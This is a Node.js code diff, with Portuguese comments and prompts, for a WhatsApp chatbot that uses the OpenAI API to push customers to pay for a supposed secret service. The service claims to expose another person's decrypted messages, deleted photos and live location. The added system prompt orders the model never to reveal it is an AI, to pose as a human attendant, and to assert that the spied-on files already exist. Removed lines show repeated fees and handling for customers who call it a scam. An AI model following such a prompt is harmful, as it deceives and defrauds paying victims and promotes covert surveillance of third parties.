@@ -1,12 +1,23 @@
 const axios = require('axios');
 const db = require('../storage/db');
+const cryptoService = require('./cryptoService');
+
+/**
+ * Obtém e descriptografa a API Key da OpenAI de forma segura
+ */
+function getOpenAiApiKey() {
+  const settings = db.getSettings() || {};
+  const rawKey = process.env.OPENAI_API_KEY || settings.openaiApiKey || '';
+  if (!rawKey) return '';
+  return cryptoService.decrypt(rawKey);
+}
 
 /**
  * Classifica a resposta do lead logo após a mensagem de Boas-Vindas
  */
 async function classifyWelcomeReply(userMessage, language = 'pt') {
   const settings = db.getSettings();
-  const apiKey = settings.openaiApiKey;
+  const apiKey = getOpenAiApiKey();
   const funnel = db.getFunnel();
   const lang = (language || 'pt').toLowerCase();
 
@@ -97,7 +108,7 @@ async function classifyWelcomeReply(userMessage, language = 'pt') {
 async function classifyAndReply(userMessage, conversationHistory = [], currentStageInfo = {}, language = 'pt') {
   const funnel = db.getFunnel();
   const settings = db.getSettings();
-  const apiKey = settings.openaiApiKey;
+  const apiKey = getOpenAiApiKey();
   const lang = (language || 'pt').toLowerCase();
 
   const currentValue = currentStageInfo.value || (lang === 'pt' ? '49,90' : '49.90');
@@ -173,53 +184,75 @@ async function classifyAndReply(userMessage, conversationHistory = [], currentSt
     objectionTexts[key] = formatText(langDict[key]);
   }
 
-  let classification = null;
-
-  // 1. Classificação semântica profunda via OpenAI ChatGPT se houver API key
+  // 1. Se houver API key da OpenAI configurada, gera resposta humana, conversacional e persuasiva
   if (apiKey) {
     try {
+      const recentHistory = (conversationHistory || []).slice(-6).map(m => ({
+        role: (m.from === 'agent' || m.from === 'bot') ? 'assistant' : 'user',
+        content: m.text || (m.mediaUrl ? '[Imagem enviada]' : '')
+      })).filter(m => m.content && m.content !== '[Imagem enviada]');
+
+      let systemPrompt = settings.openaiSystemPrompt || '';
+      if (!systemPrompt || systemPrompt.length < 50) {
+        systemPrompt = `Você é a atendente de suporte oficial e consultora do sistema de verificação sigilosa de conversas.
+Seu objetivo é ser extremamente humana, acolhedora, prestativa e brasileira no tom, tirando dúvidas do cliente e direcionando-o com segurança a concluir o pagamento de R$ ${currentValue} pelo link oficial para liberar o relatório completo.
+
+Contexto do cliente:
+- O cliente já enviou o número da pessoa que ele deseja investigar.
+- O sistema já fez o rastreio inicial e enviou a prévia/prova com a foto de perfil da pessoa, mapa e áudio gravado.
+- Os arquivos completos (áudios descriptografados, fotos apagadas, mensagens de WhatsApp e localização em tempo real) já estão processados e prontos no servidor, apenas aguardando a liberação do acesso.
+- Link de pagamento: ${checkoutUrl}
+- Valor atual: R$ ${currentValue}
+
+Regras:
+1. NUNCA diga que é IA ou robô. Você é uma atendente real tirando dúvidas pelo WhatsApp.
+2. Responda diretamente ao que o cliente perguntou de forma natural, acolhedora e confiante.
+3. Se perguntar 'Por que tenho que pagar?': Explique que a prévia foi gratuita para comprovar a existência das conversas, e a taxa de R$ ${currentValue} cobre os servidores de descriptografia em tempo real e sigilo total (a pessoa nunca sabe).
+4. Se disser que vai pagar ("vou pagar", "ok", "beleza"): Agradeça e instrua: "Perfeito! Fico no seu aguardo. Assim que concluir o pagamento pelo link oficial, me envia o comprovante aqui no chat que eu já ativo a sua liberação completa na hora! 🔒".
+5. Se pedir o link ou dados: Reenvie o link oficial ${checkoutUrl}.
+6. Se disser que já pagou: Peça para enviar o comprovante por aqui.
+7. Mantenha respostas curtas e ágeis (1 a 3 parágrafos curtos), exatamente como no WhatsApp real.`;
+      } else {
+        systemPrompt = systemPrompt
+          .replace(/\{checkoutUrl\}/gi, checkoutUrl)
+          .replace(/\{currentValue\}/gi, currentValue);
+      }
+
+      const messages = [
+        { role: 'system', content: systemPrompt },
+        ...recentHistory,
+        { role: 'user', content: userMessage }
+      ];
+
       const response = await axios.post(
         'https://api.openai.com/v1/chat/completions',
         {
           model: settings.openaiModel || 'gpt-4o-mini',
-          messages: [
-            {
-              role: 'system',
-              content: `You are the AI support assistant for Mavrol Business.
-Customer is at the payment stage of ${currentValue} (already paid ${paidValue}).
-Classify customer's message into ONE category:
-- WHY_PAY: Asks why they must pay or why this stage is charged.
-- ALREADY_PAID_REFUSES_NEW: Mentions already paying ${paidValue} and questions/refuses the new ${currentValue} fee.
-- DENOUNCE_OR_SCAM: Threatens police, report, lawyer, calls it a scam or fraud.
-- WHAT_IS_TAX: Asks what the current fee of ${currentValue} is for.
-- WHEN_GET_PHOTO_OR_ACCESS: Asks when they will receive messages, photos, or full dashboard access.
-- SEND_LINK: Asks for payment link or details.
-- SAID_PAID: States in text that they already paid without attaching receipt image.
-- REFUSE_OR_RANDOM: Refusal, random greeting or unrelated short message.`
-            },
-            { role: 'user', content: userMessage }
-          ],
-          max_tokens: 20,
-          temperature: 0.1
+          messages,
+          max_tokens: 220,
+          temperature: 0.5
         },
         {
           headers: {
             Authorization: `Bearer ${apiKey}`,
             'Content-Type': 'application/json'
           },
-          timeout: 6000
+          timeout: 8000
         }
       );
 
-      classification = response.data.choices[0].message.content.trim().toUpperCase();
-      console.log(`[AI Classifier (OpenAI - ${lang})] "${userMessage}" -> ${classification}`);
+      const reply = response.data.choices[0]?.message?.content?.trim();
+      if (reply) {
+        console.log(`[AI Generator (OpenAI)] "${userMessage}" -> "${reply.slice(0, 80)}..."`);
+        return reply;
+      }
     } catch (err) {
-      console.warn('[AI Classifier Error] Usando classificador local de regras:', err.message);
-      classification = localClassifier(userMessage, currentStageInfo, lang);
+      console.warn('[AI Generator Error] Falha na geração OpenAI, usando classificador local:', err.response?.data || err.message);
     }
-  } else {
-    classification = localClassifier(userMessage, currentStageInfo, lang);
   }
+
+  // 2. Fallback: Classificador local de regras predefinidas
+  const classification = localClassifier(userMessage, currentStageInfo, lang);
 
   // Mapeamento direto para as respostas oficiais do script
   if (classification.includes('WHY_PAY')) return objectionTexts.why_pay;
